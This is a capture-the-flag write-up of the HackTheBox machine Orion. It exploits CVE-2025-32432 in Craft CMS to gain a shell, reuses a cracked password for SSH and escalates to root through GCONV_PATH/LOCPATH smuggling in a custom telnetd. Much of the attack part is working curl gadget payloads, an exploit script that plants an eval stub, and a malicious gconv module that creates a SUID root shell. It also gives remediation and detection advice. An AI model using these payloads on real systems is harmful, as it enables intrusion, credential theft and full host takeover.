---
layout: default
title: "HackTheBox - Orion"
---

# HackTheBox - Orion

**OS:** Linux (Ubuntu 22.04)

Orion is a Linux machine themed around a telecom provider. The public site runs Craft CMS
5.6.16, which is vulnerable to CVE-2025-32432, an unauthenticated remote code execution flaw
in the asset image-transform endpoint. Exploiting it yields a `www-data` shell whose `phpinfo`
output and on-disk `.env` leak the MySQL root credentials. The Craft `users` table holds a
single administrator whose bcrypt hash cracks to a plaintext password that is reused for the
system user `adam`, giving SSH and the user flag. Privilege escalation abuses a custom GNU
inetutils `telnetd` bound to localhost as root: it passes client supplied environment variables
through to `login -p`, and its `scrub_env` blacklist only strips `LD_*`. Smuggling `GCONV_PATH`
and `LOCPATH` lets an attacker point glibc at a malicious, custom multibyte gconv module that is
loaded inside the root `login` process, executing code as root.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (orion.htb) |
| Initial Access | CVE-2025-32432 Craft CMS pre-auth RCE (asset transform object injection) |
| Privilege Escalation | adam: cracked Craft bcrypt + credential reuse; root: telnetd env passthrough -> glibc GCONV_PATH gconv module |
| Final Access | `root` |

---

## Recon

### Port Scan

A fast service sweep of the top ports oriented me, while a full TCP scan ran in the background
for the record.

```
v0idravl@v0idf0rge:~$ nmap -sV --top-ports 100 -T4 <target-ip>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
v0idravl@v0idf0rge:~$ nmap -p- --min-rate 5000 -T4 <target-ip>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP. A TTL near 63 and the `Ubuntu` build strings confirm Linux.

### Web Fingerprint

The web root redirects to a virtual host, `orion.htb`. With no DNS, I drove enumeration with an
explicit `Host:` header (the attack box could not edit `/etc/hosts`), and `--resolve` for tools
that need it.

```
v0idravl@v0idf0rge:~$ whatweb -a3 --header "Host: orion.htb" http://<target-ip>
http://<target-ip> [200 OK] Country[RESERVED][ZZ], HTML5,
HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[<target-ip>], Open-Graph-Protocol,
PoweredBy[CraftCMS], Script, Title[Orion Telecom],
UncommonHeaders[x-robots-tag], X-Powered-By[Craft CMS], nginx[1.18.0]
```

`X-Powered-By: Craft CMS` is the lead. The admin panel lives at `/admin/login`, and its HTML
embeds the exact build:

```
v0idravl@v0idf0rge:~$ curl -s http://<target-ip>/admin/login -H 'Host: orion.htb' | grep -o 'Craft CMS [0-9.]*'
Craft CMS 5.6.16
```

> **Why this matters:** Craft CMS 5.6.16 sits one release below 5.6.17, the version that fixes
> CVE-2025-32432. The fixed releases are 3.9.15, 4.14.15, and 5.6.17. A 5.6.16 install is in
> the vulnerable range (5.0.0-RC1 through 5.6.16).

---

## Initial Access

### CVE-2025-32432 - Craft CMS asset-transform pre-auth RCE

CVE-2025-32432 (CVSS 10.0, discovered by Orange Cyberdefense, actively exploited in the wild)
abuses the `assets/generate-transform` controller action. The `handle` parameter is passed into
Craft's Yii based object factory, and the Yii `as <name>` behavior syntax combined with a
`__class` override lets an unauthenticated attacker instantiate arbitrary classes with attacker
controlled properties. The classic detection gadget instantiates `GuzzleHttp\Psr7\FnStream`
with `_fn_close` set to a callable that fires from the object destructor.

The endpoint requires a valid CSRF token, which Craft hands out on any page along with the
matching `CRAFT_CSRF_TOKEN` cookie. I pulled both from the login page and fired the `phpinfo`
detection gadget:

```
v0idravl@v0idf0rge:~$ CSRF=$(curl -s "http://<target-ip>/index.php?p=admin/login" -H 'Host: orion.htb' \
    -c cj.txt | grep -oP 'name="CRAFT_CSRF_TOKEN"\s+value="\K[^"]+')
v0idravl@v0idf0rge:~$ curl -s -X POST "http://<target-ip>/index.php?p=admin/actions/assets/generate-transform" \
    -H 'Host: orion.htb' -H 'Content-Type: application/json' -H "X-CSRF-Token: $CSRF" -b cj.txt \
    -d '{"assetId":1,"handle":{"width":123,"height":123,"as session":{
        "class":"craft\\behaviors\\FieldLayoutBehavior",
        "__class":"GuzzleHttp\\Psr7\\FnStream",
        "__construct()":[[]],"_fn_close":"phpinfo"}}}' \
    -o phpinfo.html -w "%{http_code}\n"
200
v0idravl@v0idf0rge:~$ grep -o 'PHP Version [0-9.]*' phpinfo.html | head -1
PHP Version 8.2.30
```

HTTP 200 with a full `phpinfo()` page confirms code execution. `assetId` 1 was a valid asset.

> **Why this works:** `GuzzleHttp\Psr7\FnStream::__destruct()` calls
> `call_user_func($this->_fn_close)`. The object-injection lets us set `_fn_close` to any string
> callable that takes no arguments, so `phpinfo` runs when the forged object is garbage collected
> at the end of the request. This proves RCE but only runs zero-argument functions.

### Looting the phpinfo output

`disable_functions` was empty (every function available), and the environment block leaked the
database credentials, security key, and web root:

```
v0idravl@v0idf0rge:~$ grep -oE "CRAFT_[A-Z_]+ *</td><td class=\"v\">[^<]+" phpinfo.html | sed 's/<[^>]*>/ = /g'
CRAFT_SECURITY_KEY  =  = RR**********************************
CRAFT_DB_DRIVER  =  = mysql
CRAFT_DB_SERVER  =  = 127.0.0.1
CRAFT_DB_DATABASE  =  = orion
CRAFT_DB_USER  =  = root
CRAFT_DB_PASSWORD  =  = Su**********************
...
DOCUMENT_ROOT']  /var/www/html/craft/web
```

### Upgrading to arbitrary command execution

The `FnStream`/`phpinfo` gadget only calls no-argument functions. The Metasploit module and the
Orange Cyberdefense write-up chain a second gadget for full command execution. I re-implemented
it myself rather than run a third-party binary on the attack box:

1. Plant an eval stub into the PHP session file. Craft stores the requested admin URL as the
   post-login "return URL" inside the session file, so a crafted query string is written to disk
   verbatim. The stub has to be sent raw (no URL-encoding) so the `<?=...?>` bytes survive into
   the session file, and it has to be the last session write before the trigger.
2. Use the `yii\rbac\PhpManager` gadget. Its constructor calls `loadFromFile()` which does
   `require($itemFile)`. Point `itemFile` at our session file and PHP executes the planted stub.
3. The stub is `<?=eval($_GET['x']);die()?>`, so the real PHP payload is passed as a query
   parameter on the trigger request and `system()` output is echoed back in the response.

The self-contained exploit (`orion_rce.py`):

```python
# 1. CSRF + session cookie
r = s.get(BASE + "/index.php", params={'p': 'admin/login'}, allow_redirects=False)
csrf = csrf_from(r.text); sid = s.cookies.get('CraftSessionId')

# 2. leak session.save_path via FnStream->phpinfo
... transform("as <rand>": FnStream _fn_close=phpinfo) ... -> /var/lib/php/sessions

# 3. plant eval stub as the post-login return URL over a raw socket (no %-encoding)
param = rand(8); stub = "<?=eval($_GET['%s']);die()?>" % param
raw_socket_get(f"/index.php?p=admin/dashboard&{param}={stub}")

# 4. PhpManager require() of the session file + payload via $_GET
transform({"as <rand>": {"class":"craft\\behaviors\\FieldLayoutBehavior",
            "__class":"yii\\rbac\\PhpManager",
            "__construct()":[{"itemFile": session_file}]}},
          get_extra={param: PHP})
```

```
v0idravl@v0idf0rge:~$ ./orion_rce.py http://<target-ip> orion.htb "system('id; hostname; whoami');"
[*] sid=5o0q4teebh1uh57pns4ckq8ufa  save_path=/var/lib/php/sessions  stub-param=FicgrTgX
[*] trigger HTTP 200, 227 bytes
----- OUTPUT -----
uid=33(www-data) gid=33(www-data) groups=33(www-data)
orion
www-data
```

> **Gotcha worth recording:** the eval stub only lands on disk if it is sent without URL
> encoding. `requests` percent-encodes query values, so the planting request must go over a raw
> socket. Otherwise the session file stores `%3C%3F...` and `require()` returns an integer,
> which `PhpManager` then tries to `foreach()` over, producing a 500 instead of code execution.

### Pivoting to the user account

The leaked MySQL root credentials let me read the Craft database directly through the web shell.
There is a single user, and the email maps to a system account named `adam`:

```
www-data@orion:/$ mysql -uroot -p'Su**********************' orion \
    -e "SELECT id,username,email,password,admin FROM users\G"
      id: 1
username: admin
   email: adam@orion.htb
password: <redacted-bcrypt-hash>   # $2y$13$...
   admin: 1
www-data@orion:/$ grep -E '/(bash|sh)$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
adam:x:1000:1000::/home/adam:/bin/bash
```

The bcrypt hash (cost 13) cracked quickly against `rockyou.txt`:

```
v0idravl@v0idf0rge:~$ john --format=bcrypt --wordlist=rockyou.txt adam.hash
da*******        (?)
1 password hash cracked, 0 left
```

> **Why this works:** Craft stores password hashes as bcrypt. Cost 13 is slow per guess, but the
> password was an early `rockyou` entry, so John recovered it in well under a minute. Always try
> the obvious wordlist before assuming a hash is uncrackable.

The plaintext is reused for the `adam` system account over SSH, giving the user flag:

```
v0idravl@v0idf0rge:~$ ssh adam@<target-ip>
adam@orion:~$ id
uid=1000(adam) gid=1000(adam) groups=1000(adam)
adam@orion:~$ cat ~/user.txt
<user-flag-redacted>
```

---

## Post-Exploitation Enumeration

`adam` has no sudo rights (`user adam may not run sudo on orion`), so I mapped the unusual parts
of the host. Two artifacts stood out.

A system binary owned by `adam` (a deliberate misconfiguration, but no root process ever runs it
on a schedule, so it is a decoy):

```
adam@orion:~$ ls -la /usr/local/bin/composer
-rwxr-xr-x 1 adam adam 3288946 Mar  6 09:43 /usr/local/bin/composer
```

A custom telnet daemon, run as root by `inetd`, bound to localhost only:

```
adam@orion:~$ grep -v '^#' /etc/inetd.conf
127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
adam@orion:~$ ss -tlnp | grep ':23'
LISTEN 0  10  127.0.0.1:23  0.0.0.0:*
adam@orion:~$ ls -la /usr/libexec/telnetd; dpkg -S /usr/libexec/telnetd
-rwxr-xr-x 1 root root 407400 Mar  6 13:38 /usr/libexec/telnetd
# (no package owns it - custom compiled, not stripped)
adam@orion:~$ file /usr/libexec/telnetd
ELF 64-bit LSB pie executable, x86-64, dynamically linked, ... with debug_info, not stripped
```

> **Why this is interesting:** a hand-compiled GNU inetutils `telnetd`, running as root, that no
> package owns, is never an accident. It is the intended escalation surface. Its hardening
> (full RELRO, canary, NX, PIE, FORTIFY, CET) rules out a memory-corruption bug, so the
> interesting behaviour must be logical.

Watching process creation during a login revealed how `telnetd` starts the login program:

```
adam@orion:~$ # /proc watcher output during a telnet connection
uid=0 :: telnetd
uid=0 :: /usr/bin/login -p -h localhost
```

> **The key observation:** `login -p`. The `-p` flag tells `login` to **preserve the
> environment** it inherits. `telnetd` builds that environment from the client supplied
> `NEW-ENVIRON` telnet option (RFC 1572). So a telnet client can hand environment variables to a
> process that runs as root.

---

## Privilege Escalation

### Step 1 - what survives telnetd's environment scrubbing

GNU inetutils `telnetd` calls `scrub_env()` before launching `login`, dropping dangerous
variables. The unstripped binary shows the blacklist is prefix based and small:

```
v0idravl@v0idf0rge:~$ strings -a telnetd | grep -E '^(_RLD_|LIBPATH=|IFS=)$'
_RLD_
LIBPATH=
IFS=
v0idravl@v0idf0rge:~$ strings -a telnetd | grep -i gconv      # (no output)
```

The reject list is `{"LD_", "_RLD_", "LIBPATH=", "IFS="}`. It strips the loader variables
(`LD_PRELOAD`, `LD_LIBRARY_PATH`) but it does **not** strip `GCONV_PATH` or `LOCPATH`, two glibc
variables that also lead to code execution. I confirmed delivery by logging into a telnet shell
as `adam` and dumping the environment:

```
adam@orion:~$ # telnet client that sends GCONV_PATH/FOOBAR via NEW-ENVIRON, then logs in as adam
adam@orion:~$ env | grep -E 'GCONV|FOOBAR'
GCONV_PATH=/tmp/gconv
FOOBAR=yes
```

`GCONV_PATH` reaches the session intact, which means it also reached the root `login` process
that set the session up.

> **Why login honours it:** `/usr/bin/login` is mode `0755`, not setuid. It is executed directly
> by the root `telnetd`, so it is an ordinary root process. glibc only ignores `GCONV_PATH`/
> `LOCPATH` in secure-execution mode (setuid/setgid binaries); for a normal root process they are
> fully honoured. `LD_PRELOAD` would have been simpler, but `scrub_env` removes it; `GCONV_PATH`
> slips through.

### Step 2 - a malicious gconv module

`GCONV_PATH` tells glibc where to find character-set conversion modules. glibc reads a
`gconv-modules` file there, and when a conversion to or from a named charset is requested, it
`dlopen()`s the matching `.so`. The shared object's constructor runs immediately on load, before
glibc even looks up the gconv symbols, so a plain constructor is enough.

```c
// gconv_mod.c
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void pwn(void){
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/.rootbash; chmod 6755 /tmp/.rootbash; id > /tmp/.gconv_ran");
}
```

```
adam@orion:~$ mkdir -p /tmp/gconv
adam@orion:~$ gcc -shared -fPIC -o /tmp/gconv/pwnmod.so gconv_mod.c
adam@orion:~$ printf 'module\tINTERNAL\tPWN//\tpwnmod\t1\nmodule\tPWN//\tINTERNAL\tpwnmod\t1\n' \
    > /tmp/gconv/gconv-modules
adam@orion:~$ echo test | GCONV_PATH=/tmp/gconv iconv -f UTF-8 -t PWN   # local sanity check
adam@orion:~$ ls -la /tmp/.rootbash
-rwsr-sr-x 1 adam adam 1396520 ... /tmp/.rootbash   # constructor ran (as adam here)
```

The module loads and runs whenever an actual conversion to the fake `PWN` charset happens.

### Step 3 - forcing root login to perform a conversion

The hard part is making the root `login` process trigger a `PWN` conversion. Two obstacles:

- `setlocale(LC_ALL, "C.PWN")` does nothing, because glibc special-cases the `C` locale and
  ignores the codeset.
- `setlocale(LC_ALL, "en_US.PWN")` fails, because there is no locale data for it, so glibc falls
  back and never needs the converter.

The fix is `LOCPATH`, which is also not scrubbed. I built a private locale named `en_US.PWN` from
a custom charmap whose `code_set_name` is `PWN`, and crucially made it a **multibyte** codeset
(copied from the UTF-8 charmap). A single-byte ASCII-like codeset lets glibc use its built-in
fast path and skip the module; a multibyte codeset forces glibc to load the named converter for
any byte processing.

```
adam@orion:~$ zcat /usr/share/i18n/charmaps/UTF-8.gz > /tmp/pwn.cm
adam@orion:~$ sed -i 's/<code_set_name>.*/<code_set_name> "PWN"/; s/<mb_cur_max>.*/<mb_cur_max> 6/' /tmp/pwn.cm
adam@orion:~$ LOCPATH=/tmp/locale localedef -f /tmp/pwn.cm -i en_US /tmp/locale/en_US.PWN
adam@orion:~$ ls /tmp/locale/en_US.PWN/
LC_CTYPE  LC_MESSAGES  ...
```

With the locale in place, `setlocale(LC_ALL, "en_US.PWN")` now succeeds inside `login`, and the
multibyte processing `login` performs while running as root (before it drops to `adam`) loads
`pwnmod.so`. The final exploit sends `GCONV_PATH`, `LOCPATH`, and the `en_US.PWN` locale through
`NEW-ENVIRON`, then completes a normal `adam` login over telnet:

```python
# final.py - NEW-ENVIRON values
VARS = [("GCONV_PATH","/tmp/gconv"), ("LOCPATH","/tmp/locale"),
        ("LC_ALL","en_US.PWN"), ("LANG","en_US.PWN"), ("LC_CTYPE","en_US.PWN")]
# negotiate NEW-ENVIRON (opt 39), answer the server's SEND with the IS payload,
# then drive: login: -> adam, Password: -> da*******
```

```
adam@orion:~$ python3 final.py
[*] login completed
adam@orion:~$ ls -la /tmp/.rootbash /tmp/.gconv_ran; cat /tmp/.gconv_ran
-rw-r--r-- 1 root root      39 ... /tmp/.gconv_ran
-rwsr-sr-x 1 root root 1396520 ... /tmp/.rootbash
uid=0(root) gid=0(root) groups=0(root)
```

The marker file is now owned by `root` and contains `uid=0` - the gconv module executed inside
the root `login` process. The dropped SUID bash gives a root shell and the flag:

```
adam@orion:~$ /tmp/.rootbash -p -c 'id; cat /root/root.txt'
uid=1000(adam) gid=1000(adam) euid=0(root) egid=0(root) groups=0(root),1000(adam)
<root-flag-redacted>
```

> **Why multibyte was the missing piece:** with an ASCII-like single-byte `PWN` codeset, glibc
> handles bytes 0x00 to 0x7f with an internal routine and never `dlopen()`s the module, so the
> conversion fired only in the post-login `adam` shell. Declaring `PWN` as a multibyte codeset
> (`mb_cur_max` > 1) removes the fast path: glibc must call the external converter for `login`'s
> own multibyte processing, which happens while it is still root.

---

## Root Cause

Two independent flaws chain into full compromise:

1. **CVE-2025-32432 (Craft CMS):** the `assets/generate-transform` action passes attacker
   controlled JSON into Yii's object factory. The `as <name>` behavior syntax plus a `__class`
   override is an object-injection primitive, allowing instantiation of arbitrary classes
   (`FnStream`, `PhpManager`) whose lifecycle methods reach `call_user_func` and `require`.
   Development mode (`CRAFT_DEV_MODE=true`) made it worse by exposing stack traces and a full
   `phpinfo`, leaking every secret on the box.

2. **Custom telnetd environment passthrough:** a hand-built `telnetd` runs `login -p`, preserving
   a client controlled environment whose only sanitisation is an `LD_*`/`IFS`/`LIBPATH`
   blacklist. `GCONV_PATH` and `LOCPATH` are glibc code-execution vectors that the blacklist
   misses, and `login` runs as a non-setuid root process, so glibc honours them.

---

## Impact

Unauthenticated, internet-facing remote code execution as `www-data`, escalating to full root.
An attacker obtains the database (MySQL root), the Craft security key (which signs cookies and
encrypts stored secrets), every credential in the CMS, and ultimately complete control of the
host, including persistence and lateral movement into anything the box can reach.

---

## Remediation

Priority ordered. The first items break the exploit chain; the rest are hardening.

1. **Update Craft CMS** to 5.6.17 or later (or 4.14.15 / 3.9.15). This closes CVE-2025-32432.
2. **Disable development mode in production:** set `CRAFT_DEV_MODE=false`. This removes the stack
   traces and `phpinfo` that leaked the database and security-key secrets.
3. **Remove the custom telnet service.** Delete the `inetd` telnet entry and the custom
   `telnetd`/`login -p` setup. Telnet is plaintext and should not exist; running it as root with
   client-controlled environment passthrough is the privilege-escalation primitive itself.
4. **Rotate every leaked secret:** the MySQL root password, the `CRAFT_SECURITY_KEY`, and the
   `adam` account password. Do not reuse the CMS administrator password for a system account.
5. **Restrict file ownership:** `/usr/local/bin/composer` should be owned by root, not `adam`.
6. **Use strong, unique passwords** that do not appear in public wordlists for all accounts.

### Validation

- `curl` the `generate-transform` endpoint with the `__class` gadget and confirm it returns an
  error rather than executing (post-update).
- Confirm `nc 127.0.0.1 23` is refused and no `telnetd` is registered with `inetd`/`xinetd`.
- Confirm error responses no longer contain stack traces or `phpinfo`.
- `ls -l /usr/local/bin/composer` shows `root root`.

---

## Detection Opportunities

- **Web logs:** POST requests to `actions/assets/generate-transform`, especially bodies
  containing the string `__class`, are the CVE-2025-32432 signature. Any such request from an
  unauthenticated source is malicious.
- **Session-file writes:** the RCE upgrade writes `<?=eval...?>` into PHP session files. Alerting
  on PHP open tags inside `session.save_path` files catches the object-injection-to-RCE step.
- **Process auditing:** the host runs `auditd` with the `laurel` event plugin. A `login` child
  process that `dlopen()`s a shared object from a world-writable path such as `/tmp` (visible as
  an `openat`/`mmap` of `/tmp/gconv/pwnmod.so` by a uid 0 `login`), or `login` reading a
  `gconv-modules` file under `/tmp`, is a high-fidelity signal of the GCONV_PATH abuse.
- **inetd/telnet:** any successful connection to the localhost telnet service warrants review;
  legitimate use should be zero.

---

## Lessons Learned

- Pin the exact framework version early. Craft 5.6.16 versus 5.6.17 is the entire difference
  between a hard box and a one-request RCE.
- A public PoC that only proves a bug (here, `phpinfo`) is a starting point, not the finish line.
  Reading the Metasploit module and re-implementing the `PhpManager` gadget gave reliable command
  execution with output.
- `scrub_env` blacklists age badly. Stripping `LD_*` while forwarding `GCONV_PATH` and `LOCPATH`
  is a textbook example of an allowlist being the only safe design for environment passthrough to
  a privileged process.
- For glibc `GCONV_PATH` escalation, the codeset must be **multibyte** to force the external
  converter; an ASCII-like codeset lets glibc use its built-in path and the module never loads in
  the privileged process.

---

## Cleanup

Everything was run on the target; nothing untrusted was executed on the attack box. Artifacts
dropped on the target during the engagement and removed afterwards:

- `/tmp/gconv/` (malicious gconv module and `gconv-modules`), `/tmp/locale/` (custom `en_US.PWN`
  locale), `/tmp/pwn.cm`, `/tmp/gconv_mod.c`.
- `/tmp/.rootbash` (SUID root bash), `/tmp/.gconv_ran`, and the various staging scripts
  (`/tmp/*.py`, `/tmp/.lp.*`, `/tmp/.pm*`).
- The PHP session file used for the RCE upgrade expires on its own; no persistent web shell was
  left on disk.
- `/usr/local/bin/composer` was briefly used while testing a decoy path; the original binary was
  backed up to `/tmp/composer.real` first and restored byte-for-byte afterwards.

No AD objects, ACLs, or accounts were modified.
